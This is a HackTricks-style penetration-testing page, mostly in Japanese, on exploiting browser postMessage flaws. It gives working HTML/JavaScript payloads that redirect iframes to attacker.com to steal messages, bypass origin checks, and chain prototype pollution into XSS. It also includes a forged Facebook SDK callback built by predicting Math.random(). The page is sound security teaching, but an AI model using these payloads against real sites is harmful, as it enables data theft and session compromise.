# PostMessage 脆弱性

{{#include ../../banners/hacktricks-training.md}}

## **PostMessage** を送信

**PostMessage** はメッセージを送信するために次の関数を使用します:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
**second scenario** では、**message can only be sent to that domain**（たとえ Window オブジェクトの origin が異なっていても）。\
もし **wildcard** が使われている場合、**messages could be sent to any domain** となり、Window オブジェクトの origin に送信されます。

### iframe と wildcard を狙った **targetOrigin** の攻撃

この[**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)で説明されているように、もし `X-Frame-Header` 保護がなく **iframed** 可能なページを見つけ、かつ **postMessage** を使って **wildcard** (*) を指定して **sending sensitive** なメッセージを送信している場合、**iframe** の **origin** を **modify** して、**leak** その **sensitive** メッセージをあなたが管理するドメインに送ることができます。\
ただし、ページを iframed 可能でも **targetOrigin** が **set to a URL and not to a wildcard** に設定されている場合、この手法は機能しません。
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener の悪用

**`addEventListener`** は、JS が **`postMessages` を受け取る** 関数を宣言するために使用する関数です。\
以下のようなコードが使われます:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### 列挙

現在のページで event listeners を見つけるには、次の方法があります:

- **JSコードを検索**して `window.addEventListener` と `$(window).on` を探す（_JQuery version_）
- **開発者ツールのコンソールで実行**: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **ブラウザの開発者ツールで開く**: _Elements --> Event Listeners_

![](<../../images/image (396).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) や [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) のような **browser extension** を使う。これらのブラウザ拡張は**すべてのメッセージを傍受して**表示します。

### Originチェックのバイパス

- **`event.isTrusted`** 属性は、正規のユーザー操作で生成されたイベントに対してのみ `True` を返すため、セキュリティ上有用と見なされます。正しく実装されていれば回避は困難ですが、セキュリティチェックにおける重要性は高いです。
- PostMessage イベントの origin 検証に **`indexOf()`** を使うとバイパスされる可能性があります。以下はこの脆弱性を示す例です:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- **`search()`**（String.prototype.search）は正規表現用で、文字列を渡すと暗黙的に正規表現へ変換されます。正規表現ではドット（.）がワイルドカードになり、特殊に細工されたドメインで検証を回避される可能性があります。例えば:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- **`match()`** も `search()` と同様に正規表現を処理するため、不適切な正規表現だとバイパスされる可能性があります。
- **`escapeHtml`** 関数は入力をエスケープしてサニタイズする目的ですが、新しいエスケープ済みオブジェクトを作るのではなく既存オブジェクトのプロパティを上書きします。この挙動は悪用可能です。特に、制御可能なプロパティが `hasOwnProperty` を認識しないように操作できる場合、`escapeHtml` は期待どおりに動作しません。以下の例を参照してください:

- 期待される失敗:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- escape の回避:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

この脆弱性の文脈では、`File` オブジェクトは読み取り専用の `name` プロパティがあるため特に悪用されやすく、テンプレートで使われた場合に `escapeHtml` によってサニタイズされない可能性があります。

- JavaScript の `document.domain` プロパティはスクリプトによって設定可能で、ドメインを短縮することで同一親ドメイン内でより緩い same-origin ポリシーを適用することができます。

### e.origin == window.origin のバイパス

sandboxed iframe を %%%%%% で埋め込む場合、iframe の origin は null に設定されることを理解しておく必要があります。これは sandbox 属性とそのセキュリティ・機能への影響において特に重要です。

sandbox 属性に **`allow-popups`** を指定すると、iframe 内から開かれた popup ウィンドウは親の sandbox 制限を継承します。つまり、**`allow-popups-to-escape-sandbox`** 属性も含まれていない限り、popup ウィンドウの origin も同様に `null` に設定され、iframe と同じ origin になります。

その結果、この条件下で popup が開かれ、iframe から popup に **`postMessage`** でメッセージが送られると、送信側と受信側の両方の origin が `null` になり、両者が同じ origin 値 `null` を共有するため **`e.origin == window.origin`** は true (`null == null`) になります。

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### e.source のバイパス

スクリプトがリスニングしている同じウィンドウからメッセージが来たかどうかを確認することが可能です（特に **Content Scripts from browser extensions** が同じページから送られたかを確認する用途で有用）:
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
メッセージの **`e.source`** を null にするには、**iframe** を作成して **postMessage** を **sends** し、それを **immediately deleted** することで可能です。

For more information **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

これらの攻撃を行うには、理想的には被害者のウェブページを `iframe` 内に配置できる必要があります。\
しかし、`X-Frame-Header` のようなヘッダーがその**挙動**を**阻止**することがあります。\
そのような場合でも、よりステルス性の低い攻撃を使うことができます。脆弱な Web アプリケーションを新しいタブで開き、そこに対して通信できます：
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### メインページをブロックして child に送られるメッセージを盗む

以下のページでは、データ送信前に**blocking**した**main**ページを利用して、**sensitive postmessage data**として**child iframe**に送られる情報を盗み、**XSS in the child**を悪用して受信される前にそのデータを**leak the data**する方法が確認できます:

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe の location を変更してメッセージを盗む

X-Frame-Header のない、別の iframe を含む webpage を埋め込める場合、**change the location of that child iframe**ことができ、その iframe が**postmessage**を**wildcard**を使って送信されるメッセージを受信している場合、攻撃者はその iframe の**origin**を自分が**controlled**するページに**change**してメッセージを**steal**することができます:

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage を使った Prototype Pollution および/または XSS

`postMessage`を通じて送られたデータがJSによって実行されるシナリオでは、**iframe**でその**page**を埋め込み、`postMessage`経由でエクスプロイトを送ることで**prototype pollution/XSS**を**exploit**できます。

**`postMessage` を介した XSS を非常に分かりやすく説明した記事**は次のリンクにあります: [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

`iframe` に対する `postMessage` を通じて **Prototype Pollution and then XSS** を悪用するエクスプロイトの例:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
For **more information**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Predicting **`Math.random()`** callback tokens in postMessage bridges

メッセージ検証が `Math.random()` で生成した「shared secret」（例: `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`）を使い、かつ同じヘルパーがプラグイン iframe の名前付けにも使われている場合、PRNG の出力を復元して信頼されたメッセージを偽造できます。

- **Leak PRNG outputs via `window.name`:** SDK はプラグイン iframe に `guid()` で自動的に名前を付けます。トップフレームを制御できる場合、被害者ページを iframe として読み込み、プラグイン iframe を自分のオリジンに移動（例: `window.frames[0].frames[0].location='https://attacker.com'`）して、`window.frames[0].frames[0].name` を読み取ることで生の `Math.random()` 出力を取得できます。
- **Force more outputs without reloads:** 一部の SDK は再初期化用のパスを公開しています。FB SDK では `{xfbml:1}` を付けて `init:post` を発行すると `XFBML.parse()` が強制され、プラグイン iframe が破棄・再作成されて新しい名前／コールバック ID が生成されます。再初期化を繰り返すことで必要なだけの PRNG 出力が得られます（コールバック／iframe ID 用の追加の内部 `Math.random()` 呼び出しがあるため、中間の値はスキップする必要があります）。
- **Trusted-origin delivery via parameter pollution:** ファーストパーティのプラグインエンドポイントが未サニタイズのパラメータをクロスウィンドウのペイロードに反映する場合（例: `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`）、trusted な `facebook.com` オリジンを保持したまま `&type=...&iconSVG=...` を注入できます。
- **Predict the next callback:** 漏えいした iframe 名を `[0,1)` の浮動小数点に戻し、いくつかの値（連続でなくても良い）を V8 `Math.random` 予測器（例: Z3 ベース）に与えます。次の `guid()` をローカルで生成して期待されるコールバックトークンを偽造します。
- **Trigger the sink:** postMessage データを生成してブリッジが `xd.mpn.setupIconIframe` をディスパッチし、`iconSVG` に HTML を注入するようにします（例: URL エンコードされた `<img src=x onerror=...>`）。これによりホスティングオリジン内で DOM XSS を達成でき、そこから same-origin の iframe（OAuth ダイアログ、arbiter など）を読み取れます。
- **Framing quirks help:** このチェーンはフレーミングを必要とします。いくつかのモバイル webview では `frame-ancestors` が存在する場合に `X-Frame-Options` がサポートされない `ALLOW-FROM` に劣化することがあり、"compat" パラメータが許容的な `frame-ancestors` を強制して `window.name` サイドチャネルを有効にすることがあります。

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## 参考資料

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- 練習用: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
